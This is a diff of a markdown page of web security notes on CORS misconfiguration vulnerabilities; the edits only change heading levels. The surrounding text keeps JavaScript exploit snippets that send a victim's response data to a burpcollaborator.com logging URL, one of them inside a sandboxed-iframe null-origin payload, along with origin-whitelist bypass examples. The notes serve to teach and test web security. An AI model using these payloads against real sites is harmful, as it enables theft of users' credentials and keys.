@@ -4,11 +4,11 @@ title: Cross-Origin Resource Sharing (CORS)
 
 Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF). 
 
-# Vulnerabilities arising from CORS configuration issues
+## Vulnerabilities arising from CORS configuration issues
 
 Many modern websites use CORS to allow access from subdomains and trusted third parties. Their implementation of CORS may contain mistakes or be overly lenient to ensure that everything works, and this can result in exploitable vulnerabilities. 
 
-## Server-generated ACAO header from client-specified Origin header
+### Server-generated ACAO header from client-specified Origin header
 
 Some applications need to provide access to a number of other domains. Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route of effectively allowing access from any other domain. 
 
@@ -57,7 +57,7 @@ function reqListener() {
 location='https://burpcollaborator.com/log?key='+this.responseText;
 };
 ```
-## Errors parsing Origin headers
+### Errors parsing Origin headers
 
 Some applications that support access from multiple origins do so by using a whitelist of allowed origins.
 
@@ -68,7 +68,7 @@ They can create some rules that can be bypassed:
 * **Starts With**: Suppose an application grants access to all domains beginning with `example.com`. We can use `example.com.evil.com`
 * **Ends With**: Suppose an application grants access to all domains ending in `example.com`. We can buy a domain something like `evil-example.com`.
 
-## Whitelisted null origin value
+### Whitelisted null origin value
 
 The specification for the Origin header supports the value null. Browsers might send the value null in the Origin header in various unusual situations:
 
@@ -101,7 +101,7 @@ location='https://burpcollaborator.com/log?key='+this.responseText;
 </script>"></iframe>
 ```
 
-## Exploiting XSS via CORS trust relationships
+### Exploiting XSS via CORS trust relationships
 
 Even "correctly" configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.
 
@@ -109,7 +109,7 @@ Even "correctly" configured CORS establishes a trust relationship between two or
 https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
 ```
 
-## Breaking TLS with poorly configured CORS
+### Breaking TLS with poorly configured CORS
 
 Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. An attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application. This attack involves the following steps: 
 
